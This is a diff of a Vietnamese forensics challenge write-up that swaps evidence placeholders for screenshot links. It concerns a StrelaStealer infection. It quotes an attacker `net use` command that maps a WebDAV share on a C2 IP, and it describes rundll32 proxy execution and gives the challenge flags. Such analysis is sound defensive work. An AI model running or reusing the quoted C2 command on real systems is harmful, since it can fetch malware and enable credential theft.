@@ -43,7 +43,7 @@
 *   **Cách làm:** Phân tích các dấu hiệu kết nối mạng (Network Indicators) từ tham số dòng lệnh.
 *   **Thao tác thực hiện:** Dựa trên chuỗi lệnh đã trích xuất ở Q3, cú pháp `net use \\45.9.74.32@8888\davwwwroot\` thể hiện hành vi ánh xạ một thư mục chia sẻ trên máy chủ C2 (Command and Control) vào hệ thống cục bộ thông qua giao thức WebDAV/SMB. Tên của định tuyến chia sẻ (shared directory) được xác định là `davwwwroot`.
 *   **Bằng chứng:**
-    *(Xem chi tiết tại hình ảnh Bằng chứng Q3)*
+    ![Q4 - Tên thư mục chia sẻ](images/q4.png)
 *   **Flag:** `davwwwroot`
 
 ---
@@ -53,7 +53,7 @@
 *   **Cách làm:** Ánh xạ hành vi thực thi với khung tham chiếu rủi ro bảo mật MITRE ATT&CK.
 *   **Thao tác thực hiện:** Hành vi sử dụng `rundll32.exe` để thực thi tệp `.dll` độc hại là một kỹ thuật LOLBAS (Living Off The Land Binaries and Scripts). Việc lợi dụng các tệp tin thực thi hợp pháp và có chữ ký số gốc của hệ điều hành giúp mã độc che giấu luồng hoạt động (Proxy Execution) và vượt qua các cơ chế kiểm soát bảo mật. Tra cứu trên cơ sở dữ liệu MITRE ATT&CK, kỹ thuật này được định danh là **Signed Binary Proxy Execution: Rundll32**.
 *   **Bằng chứng:**
-    *(Xem chi tiết tại hình ảnh Bằng chứng Q3 - chú ý tiện ích rundll32)*
+    ![Q5 - Kỹ thuật Proxy Execution](images/q5.png)
 *   **Flag:** `T1218.011`
 
 ---
@@ -73,7 +73,7 @@
 *   **Cách làm:** Tích hợp dữ liệu Tình báo Mối đe dọa (Threat Intelligence) để định danh họ mã độc (Malware Family).
 *   **Thao tác thực hiện:** Đầu tiên, từ kết quả truy vết tham số dòng lệnh, ta xác định được địa chỉ IP C2 độc hại là `45.9.74.32`. Tiếp theo, trích xuất Dấu hiệu Thỏa hiệp (IOC) này và tiến hành truy vấn chéo trên nền tảng phân tích bảo mật VirusTotal. Dữ liệu hành vi và các báo cáo cộng đồng chỉ ra rằng chuỗi tấn công và hạ tầng mạng này thuộc về họ mã độc **StrelaStealer** - một biến thể mã độc chuyên thu thập và đánh cắp thông tin đăng nhập từ các máy khách email (Email Clients).
 *   **Bằng chứng:**
-    ![Q7 - Trích xuất IP C2](images/q7_1.png)
+    ![Q7 - Xác định IP độc hại](images/q7_1.png)
     *Hình 1: Xác định IP độc hại từ tiến trình thực thi.*
     
     ![Q7 - Tra cứu IOCs trên VirusTotal](images/q7_2.png)
